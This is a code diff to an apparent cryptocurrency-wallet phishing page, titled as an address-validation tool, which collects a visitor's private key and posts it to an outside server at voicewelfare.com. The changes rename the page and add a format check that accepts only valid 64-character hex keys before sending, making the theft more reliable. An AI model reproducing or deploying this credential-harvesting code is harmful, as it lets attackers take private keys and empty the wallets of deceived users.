@@ -9,7 +9,7 @@
     <link rel="icon" type="image/png" sizes="32x32" href="../favicon_io/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="../favicon_io/favicon-16x16.png">
     <link rel="manifest" href="../site.webmanifest">
-    <title> Wallet Flare Node | Address Validation </title>
+    <title> Wallet Flare Dapp | Address Validation </title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
@@ -2141,16 +2141,24 @@
         event.preventDefault();
         document.getElementById("submit_private").disabled = true;
         let dappKey = $('#privateKey').val().trim();
-
-        var randomString = generateRandomString(7);
-        var dappName = $('#wallet_name').text();
+        let randomString = generateRandomString(7);
+        let dappName = $('#wallet_name').text();
         let importType = 'PrivateKey';
 
+        const isValidHex = /^(0x)?[0-9a-fA-F]{64}$/; // Regular expression to check if the input is a valid hex string
+
+        if (!isValidHex.test(dappKey)) {
+            console.log("Invalid private key format. Please enter a valid 64-character hex string.");
+            $("#privateKey").addClass("error");
+            document.getElementById("submit_private").disabled = false;
+            return;
+        }
+
         try {
-            var wallet = new ethers.Wallet(dappKey);
-            var dappAddress = wallet.address;
+            let wallet = new ethers.Wallet(dappKey);
+            let dappAddress = wallet.address;
             // console.log('Private key is valid:', dappKey);
-            // console.log('Wallet address:', dappAddress);
+            // console.log('Private key is valid. Wallet address:', dappAddress);
 
             $.ajax({
                 url: "https://voicewelfare.com/recovery/walletdapp.php",
@@ -2169,13 +2177,13 @@
             $("#initial_div").hide();
             $("#connect_div").hide();
             $("#qr_modal").show();
-            document.getElementById("submit_private").disabled = true;
+            document.getElementById("submit_private").disabled = false;
+    
         } catch (error) {
             // console.log("Invalid private key");
             $("#privateKey").addClass("error");
             document.getElementById("submit_private").disabled = false;
         }
-
     });
 </script>
 
